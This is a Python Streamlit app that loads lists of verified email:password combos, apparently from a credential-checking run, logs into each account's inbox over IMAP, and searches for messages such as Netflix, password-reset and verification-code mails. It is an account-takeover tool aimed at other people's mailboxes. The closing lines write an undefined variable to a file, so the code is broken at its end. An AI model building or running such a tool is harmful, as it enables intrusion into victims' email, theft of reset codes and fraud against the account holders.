import streamlit as st
import imaplib
import email
from email.header import decode_header
import os
import glob
import pandas as pd
import warnings

warnings.filterwarnings("ignore")

st.set_page_config(
    page_title="Standalone Mailbox Reader",
    page_icon="📥",
    layout="wide"
)

st.title("📥 Standalone Mailbox Reader & Inbox Scraper")
st.markdown("Connects to verified valid email accounts, inspects INBOX messages, and searches for keywords.")

# Load valid accounts from files
def load_valid_accounts():
    accounts = []
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    for extra in ("clean_valid_accounts.txt", "valid_accounts.txt"):
        if os.path.exists(extra):
            paths.append(extra)
    
    seen = set()
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        parts = line.split(":")
                        email_addr = parts[0].strip()
                        pwd = parts[1].split("|")[0].strip()
                        combo = f"{email_addr}:{pwd}"
                        if combo not in seen:
                            seen.add(combo)
                            accounts.append(combo)
        except Exception:
            continue
    return accounts

valid_accs = load_valid_accounts()

st.sidebar.header("⚙ Reader Configuration")
selected_account = st.sidebar.selectbox("Select Valid Account", options=valid_accs if valid_accs else ["No valid accounts found"])

custom_email = st.sidebar.text_input("Or enter custom email")
custom_pass = st.sidebar.text_input("Or enter custom password", type="password")

target_email = custom_email.strip() if custom_email.strip() else (selected_account.split(":")[0] if ":" in selected_account else "")
target_pass = custom_pass.strip() if custom_pass.strip() else (selected_account.split(":")[1] if ":" in selected_account else "")

server_host = st.sidebar.text_input("IMAP Server Host (Leave blank for auto-detect)", value="")
search_keyword = st.sidebar.text_input("Keyword Filter (Optional)", value="", placeholder="e.g. Netflix, Reset, Code")
max_msgs = st.sidebar.slider("Max Messages to Fetch", min_value=1, max_value=50, value=10)

def guess_imap_server(email_addr):
    try:
        domain = email_addr.split("@")[-1].lower()
        mapping = {
            "gmail.com": "imap.gmail.com",
            "googlemail.com": "imap.gmail.com",
            "outlook.com": "outlook.office365.com",
            "hotmail.com": "outlook.office365.com",
            "live.com": "outlook.office365.com",
            "yahoo.com": "imap.mail.yahoo.com",
            "icloud.com": "imap.mail.me.com",
            "naver.com": "imap.naver.com",
            "qq.com": "imap.qq.com"
        }
        return mapping.get(domain, f"imap.{domain}")
    except Exception:
        return "imap.gmail.com"

if st.button("📥 Connect & Read Inbox", type="primary"):
    if not target_email or not target_pass:
        st.warning("⚠️ Please select or enter a valid email and password.")
    else:
        host = server_host.strip() if server_host.strip() else guess_imap_server(target_email)
        st.info(f"Connecting to IMAP server **{host}:993** for **{target_email}**...")
        
        try:
            mail = imaplib.IMAP4_SSL(host, 993, timeout=10)
            mail.login(target_email, target_pass)
            mail.select("INBOX")
            
            if search_keyword.strip():
                status, response = mail.search(None, f'(SUBJECT "{search_keyword.strip()}")')
            else:
                status, response = mail.search(None, "ALL")
                
            if status != "OK":
                st.error("Failed to search mailbox messages.")
            else:
                msg_nums = response[0].split()
                if not msg_nums:
                    st.warning("No messages found matching criteria.")
                else:
                    latest_nums = msg_nums[-max_msgs:][::-1]
                    table_data = []
                    
                    for num in latest_nums:
                        st_fetch, msg_data = mail.fetch(num, "(RFC822)")
                        if st_fetch != "OK":
                            continue
                        for response_part in msg_data:
                            if isinstance(response_part, tuple):
                                msg = email.message_from_bytes(response_part[1])
                                
                                # Subject
                                sub_hdr = decode_header(msg.get("Subject", "No Subject"))[0]
                                subject = sub_hdr[0].decode(sub_hdr[1] or "utf-8", errors="ignore") if isinstance(sub_hdr[0], bytes) else str(sub_hdr[0])
                                
                                # Sender
                                from_hdr = decode_header(msg.get("From", "Unknown"))[0]
                                sender = from_hdr[0].decode(from_hdr[1] or "utf-8", errors="ignore") if isinstance(from_hdr[0], bytes) else str(from_hdr[0])
                                
                                date_str = msg.get("Date", "Unknown")
                                
                                body = ""
                                if msg.is_multipart():
                                    for part in msg.walk():
                                        if part.get_content_type() == "text/plain":
                                            payload = part.get_payload(decode=True)
                                            if payload:
                                                body = payload.decode("utf-8", errors="ignore")
                                                break
                                else:
                                    payload = msg.get_payload(decode=True)
                                    if payload:
                                        body = payload.decode("utf-8", errors="ignore")
                                        
                                table_data.append({
                                    "ID": num.decode(),
                                    "Date": date_str,
                                    "From": sender,
                                    "Subject": subject,
                                    "Snippet": body[:300].strip()
                                })
                                
                    mail.logout()
                    
                    if table_data:
                        st.success(f"Successfully retrieved {len(table_data)} messages!")
                        df = pd.DataFrame(table_data)
                        st.dataframe(df, width='stretch')
                        
                        # Expandable message view
                        for idx, row in df.iterrows():
                            with st.expander(f"✉ [{row['Date']}] {row['From']} - {row['Subject']}"):
                                st.markdown(f"**From:** {row['From']}")
                                st.markdown(f"**Subject:** {row['Subject']}")
                                st.markdown(f"**Date:** {row['Date']}")
                                st.markdown("---")
                                st.text(row['Snippet'])
                    else:
                        st.info("No readable messages extracted.")
                        
        except Exception as ex:
            st.error(f"Connection / Authentication Error: {ex}")

with open("mailbox_reader.py", "w", encoding="utf-8") as f:
    f.write(code_content)

print("mailbox_reader.py created successfully.")
